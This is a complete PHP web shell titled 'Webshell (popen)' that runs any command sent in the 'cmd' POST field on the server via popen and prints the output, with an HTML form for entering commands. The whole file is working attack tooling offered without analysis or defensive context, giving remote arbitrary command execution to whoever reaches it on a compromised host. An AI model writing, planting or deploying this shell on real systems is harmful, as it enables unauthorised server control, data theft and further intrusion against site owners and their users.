<?php
if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $output = '';

    if (function_exists('popen')) {
        $fp = popen($command, 'r');
        if ($fp) {
            while (!feof($fp)) {
                $output .= fread($fp, 1024);
            }
            pclose($fp);
        } else {
            $output = "Failed to execute command using 'popen'.";
        }
    } else {
        $output = "The 'popen' function is not enabled.";
    }

    echo $output;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Webshell (popen)</title>
</head>
<body>
    <form method="POST" action="">
        <input type="text" name="cmd" placeholder="Enter a command">
        <input type="submit" value="Send">
    </form>
</body>
</html>

